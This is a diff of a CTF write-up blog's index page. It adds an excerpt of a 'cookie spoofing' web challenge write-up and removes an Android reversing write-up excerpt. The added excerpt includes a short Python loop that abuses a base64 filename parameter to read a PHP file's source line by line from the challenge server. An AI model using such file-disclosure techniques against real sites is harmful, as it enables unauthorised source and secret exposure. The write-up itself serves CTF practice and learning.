@@ -145,6 +145,69 @@
     
     
     <div class="col-12 col-md-8 mx-auto index-info">
+      <a href="/cookie欺骗-writeup.html">
+        <p class="h4 index-header">cookie欺骗 writeup</p>
+      </a>
+
+      <a href="/cookie欺骗-writeup.html">
+        
+        
+          
+        
+        <div class="index-excerpt">
+          <div class="index-text mb-1">
+Begin
+
+
+
+发现filename为keys.txt的base64加密，试着读取index.php文件
+
+
+
+发现能读到东西了，接下来读取整个文件
+
+from requests import *
+from base64 import *
+
+for i in range(0,20):
+    url = &quot;http://123.206.87.240:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw&quot;%i
+    respone = get(url=url)
+    print respone.text
+
+
+&lt;?php
+
+error_reporting(0);
+$file=base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);
+$line=isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;
+if($file==</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-08-21&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/web">web</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/web">web</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-8 mx-auto index-info">
       <a href="/掘安RE_crypto.html">
         <p class="h4 index-header">jactf-reverse3</p>
       </a>
@@ -720,73 +783,6 @@ n = 9668089326274971906358592360549603490994639752273505642653843732803366998533
           <i class="iconfont icon-tag"></i>
           
             <a href="/tags/crypto">crypto</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-8 mx-auto index-info">
-      <a href="/jactf-android.html">
-        <p class="h4 index-header">jactf-android</p>
-      </a>
-
-      <a href="/jactf-android.html">
-        
-        
-          
-        
-        <div class="index-excerpt">
-          <div class="index-text mb-1">平台jactf
-androideasy
-jadx打开，查看主页面
-
-可以直接看到程序通过得到editText的内容和23异或和代码定义的s进行对比
-
-exp
-app1
-jadx打开，查看主页面
-
-
-通过输入和VERSION_NAME ^ VERSION_CODE相比
-
-exp
-simplecheck
-JEBpackage com.a.simplecheck;
-
-import android.content.Context;
-import android.os.Bundle;
-import android.support.v7.app.c;
-import android.view.View$OnClickListener;
-import android.view.View;
-import android.widget.Toast;
-
-public class MainActivity extends c {
-    public MainActivity() {
-        super();
-    }
-
-    protected void onCreate(Bundle arg4</div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-08-12&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/android">android</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/android">android</a>&nbsp;
           
         
       </div>
